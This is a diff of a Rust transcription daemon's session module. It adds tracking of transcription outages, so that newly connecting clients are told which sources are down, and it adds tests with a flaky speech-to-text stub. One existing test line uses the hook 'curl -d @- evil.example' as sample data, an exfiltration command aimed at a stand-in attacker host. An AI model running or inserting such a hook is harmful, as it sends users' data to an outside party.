@@ -1,6 +1,6 @@
 //! The session: the socket, the overlay and one capture pipeline per saved config.
 
-use std::collections::{BTreeSet, HashMap};
+use std::collections::{BTreeMap, BTreeSet, HashMap};
 use std::future::Future;
 use std::io;
 use std::path::{Path, PathBuf};
@@ -234,6 +234,45 @@ struct Channels {
     emit: Emit,
     vad: SileroModel,
     diarizer: Diarizer,
+    outages: Outages,
+}
+
+/// The sources whose streaming transcription is down now, each with the
+/// `transcription` event that said so, for the clients that connect later.
+#[derive(Clone, Default)]
+struct Outages(Arc<Mutex<BTreeMap<String, Value>>>);
+
+impl Outages {
+    /// The event `trouble` makes for `who`, noted: down holds until back.
+    fn note(&self, who: &str, trouble: &Trouble) -> Value {
+        let event = transcription(who, trouble);
+        let mut down = self.0.lock().expect("not poisoned");
+        match trouble {
+            Trouble::Down(_) => {
+                down.insert(who.to_string(), event.clone());
+            }
+            Trouble::Back { .. } => {
+                down.remove(who);
+            }
+            Trouble::Failed(_) => {}
+        }
+        event
+    }
+
+    /// The `transcription` down event of every source down now.
+    fn events(&self) -> Vec<Value> {
+        let down = self.0.lock().expect("not poisoned");
+        down.values().cloned().collect()
+    }
+}
+
+/// Forgets a source's outage once its transcriber stops, however it stops.
+struct Stopped<'a>(&'a Outages, &'a str);
+
+impl Drop for Stopped<'_> {
+    fn drop(&mut self) {
+        self.0.0.lock().expect("not poisoned").remove(self.1);
+    }
 }
 
 /// One transcriber: an input's audio read from the hub by one model in one
@@ -247,10 +286,11 @@ fn transcriber(
     (models, cell): (Models, Ready),
     from: Listening,
     assistant: Assistant,
-    emit: Emit,
+    (emit, outages): (Emit, Outages),
     lines: Option<Arc<Mutex<Vec<HeardLine>>>>,
 ) -> BoxFuture<'static, ()> {
     Box::pin(async move {
+        let _stopped = Stopped(&outages, &who);
         let built = cell.get_or_init(|| async {
             let built = build(&models, &from).await;
             if let Err(reason) = &built {
@@ -280,7 +320,7 @@ fn transcriber(
                 }
             }
         };
-        let trouble = |who: &str, trouble: Trouble| emit(transcription(who, &trouble));
+        let trouble = |who: &str, trouble: Trouble| emit(outages.note(who, &trouble));
         let partial = |words: String| assistant.hear_partial(&from, &who, &words);
         let bills = assistant.bills(&from);
         let request = |id: String| bills.opened(id);
@@ -311,6 +351,7 @@ impl Work for Channels {
                 emit,
                 vad,
                 diarizer,
+                outages,
             } = self;
             let recording = listening.is_some();
             // While a session records, the user's microphone may be echo-cancelled;
@@ -410,7 +451,7 @@ impl Work for Channels {
                         model,
                         listen.clone(),
                         assistant,
-                        Arc::clone(emit),
+                        (Arc::clone(emit), outages.clone()),
                         lines,
                     )
                 });
@@ -558,6 +599,7 @@ struct Rig {
     audio: Arc<dyn AudioDevices>,
     vad: SileroModel,
     diarizer: Diarizer,
+    outages: Outages,
 }
 
 /// Capture, transcribe and serve actions with one configuration until dropped.
@@ -567,6 +609,7 @@ async fn pipeline(config: Config, assistant: Assistant, emit: Emit, rig: Rig) {
         audio,
         vad,
         diarizer,
+        outages,
     } = rig;
     let devices = if replay.is_some() {
         Vec::new()
@@ -776,6 +819,7 @@ async fn pipeline(config: Config, assistant: Assistant, emit: Emit, rig: Rig) {
         emit: Arc::clone(&emit),
         vad,
         diarizer,
+        outages,
     };
     // Transcribe only while a session records; otherwise only measure the inputs,
     // so the overlay shows they work.
@@ -1079,11 +1123,12 @@ impl Pending {
     }
 }
 
-/// What a client that connects is told first: the daemon, the snapshot, and
-/// the change held for the user, if any.
+/// What a client that connects is told first: the daemon, the snapshot, the
+/// sources whose transcription is down, and the change held for the user, if any.
 fn greeting(
     assistant: Assistant,
     overlay_open: Arc<AtomicBool>,
+    outages: Outages,
     pending: Arc<Mutex<Pending>>,
 ) -> Greeting {
     Arc::new(move || {
@@ -1094,6 +1139,7 @@ fn greeting(
             "overlay": overlay_open.load(Ordering::Relaxed),
         })];
         events.extend(assistant.snapshot());
+        events.extend(outages.events());
         events.extend(pending.lock().expect("not poisoned").event());
         events
     })
@@ -1971,9 +2017,11 @@ pub async fn run(
     let (commands, received) = mpsc::unbounded_channel();
     let overlay_open = Arc::new(AtomicBool::new(false));
     let pending: Arc<Mutex<Pending>> = Arc::default();
+    let outages = Outages::default();
     let greeting = greeting(
         assistant.clone(),
         Arc::clone(&overlay_open),
+        outages.clone(),
         Arc::clone(&pending),
     );
     let _control = ControlSocket::bind(&paths::socket_path(), clients, greeting, commands).await?;
@@ -2003,6 +2051,7 @@ pub async fn run(
             audio: Arc::new(PipeWire),
             vad,
             diarizer,
+            outages,
         },
         assistant,
         emit,
@@ -2034,7 +2083,7 @@ mod tests {
     use futures::stream::{self, StreamExt};
 
     use super::*;
-    use crate::ports::{EchoCancelling, Frame};
+    use crate::ports::{EchoCancelling, FRAME_SAMPLES, Frame, Heard, TranscriptionError};
 
     fn raw() -> Value {
         json!({
@@ -2597,5 +2646,132 @@ mod tests {
         assert!(pending.take(first["id"].as_str().unwrap()).is_none());
         let config = pending.take(second["id"].as_str().unwrap()).unwrap();
         assert_eq!(config.actions[0].hook, "curl -d @- evil.example");
+    }
+
+    /// The first event `wanted` picks, once it is emitted.
+    async fn until(events: &Mutex<Vec<Value>>, wanted: impl Fn(&Value) -> bool) -> Value {
+        let deadline = std::time::Instant::now() + Duration::from_secs(20);
+        loop {
+            let found = events.lock().unwrap().iter().find(|e| wanted(e)).cloned();
+            if let Some(event) = found {
+                return event;
+            }
+            let waiting = std::time::Instant::now() < deadline;
+            assert!(waiting, "never emitted: {:?}", events.lock().unwrap());
+            tokio::time::sleep(Duration::from_millis(5)).await;
+        }
+    }
+
+    /// An assistant with no session log and its people in `dir`.
+    fn assistant(emit: &Emit, dir: &Path) -> Assistant {
+        let people = PeopleFiles::new(dir.join("people"));
+        Assistant::new(
+            Arc::clone(emit),
+            Arc::new(NoSessionFiles),
+            Arc::new(people),
+            Arc::new(ShellHooks),
+        )
+    }
+
+    /// A streaming transcription that refuses every connection while `down`,
+    /// and otherwise takes the audio and hears nothing in it.
+    struct Flaky(Arc<AtomicBool>);
+
+    impl StreamingSpeechToText for Flaky {
+        fn transcribe<'a>(
+            &'a self,
+            frames: stream::BoxStream<'a, Frame>,
+        ) -> stream::BoxStream<'a, Result<Heard, TranscriptionError>> {
+            if self.0.load(Ordering::Relaxed) {
+                let refused = TranscriptionError("refused".into());
+                return stream::iter([Err(refused)]).boxed();
+            }
+            frames.filter_map(|_| async { None }).boxed()
+        }
+    }
+
+    /// The transcriber of the input "mic", heard as "Eles", on `stt`.
+    fn transcribing(
+        stt: Stt,
+        assistant: &Assistant,
+        emit: &Emit,
+        outages: &Outages,
+    ) -> (Capture, JoinHandle<()>) {
+        let mut hub = Hub::default();
+        let capture = hub.input("mic");
+        let reader = hub.read("mic").unwrap();
+        let cell: Ready = Arc::new(OnceCell::new_with(Some(Ok(stt))));
+        let listening = Listening {
+            model: "w".into(),
+            language: "pt".into(),
+        };
+        let running = tokio::spawn(transcriber(
+            "Eles".into(),
+            reader,
+            (Arc::default(), cell),
+            listening,
+            assistant.clone(),
+            (Arc::clone(emit), outages.clone()),
+            None,
+        ));
+        (capture, running)
+    }
+
+    fn told(greeting: &Greeting) -> Vec<Value> {
+        let events = greeting();
+        events
+            .into_iter()
+            .filter(|event| event["type"] == "transcription")
+            .collect()
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn a_client_that_connects_while_a_source_is_down_is_told_until_it_is_back() {
+        let dir = tempfile::tempdir().unwrap();
+        let (emit, events) = recorder();
+        let assistant = assistant(&emit, dir.path());
+        let outages = Outages::default();
+        let greeting = greeting(
+            assistant.clone(),
+            Arc::default(),
+            outages.clone(),
+            Arc::default(),
+        );
+        let down = Arc::new(AtomicBool::new(true));
+        let stt = Stt::Stream(Box::new(Flaky(Arc::clone(&down))));
+        let (capture, _running) = transcribing(stt, &assistant, &emit, &outages);
+        capture.send(Captured::Frame(0, vec![0; FRAME_SAMPLES]));
+        until(&events, |event| event["state"] == "down").await;
+        assert_eq!(
+            told(&greeting),
+            [
+                json!({"type": "transcription", "who": "Eles", "state": "down",
+                    "code": "stt.down", "detail": "refused"})
+            ]
+        );
+        down.store(false, Ordering::Relaxed);
+        capture.send(Captured::Frame(1, vec![0; FRAME_SAMPLES]));
+        until(&events, |event| event["state"] == "back").await;
+        assert_eq!(told(&greeting), [] as [Value; 0]);
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn a_source_no_one_transcribes_any_more_is_not_told_down() {
+        let dir = tempfile::tempdir().unwrap();
+        let (emit, events) = recorder();
+        let assistant = assistant(&emit, dir.path());
+        let outages = Outages::default();
+        let greeting = greeting(
+            assistant.clone(),
+            Arc::default(),
+            outages.clone(),
+            Arc::default(),
+        );
+        let stt = Stt::Stream(Box::new(Flaky(Arc::new(AtomicBool::new(true)))));
+        let (_capture, running) = transcribing(stt, &assistant, &emit, &outages);
+        until(&events, |event| event["state"] == "down").await;
+        assert_eq!(told(&greeting).len(), 1);
+        stop(Some(running)).await;
+        assert_eq!(told(&greeting), [] as [Value; 0]);
     }
 }
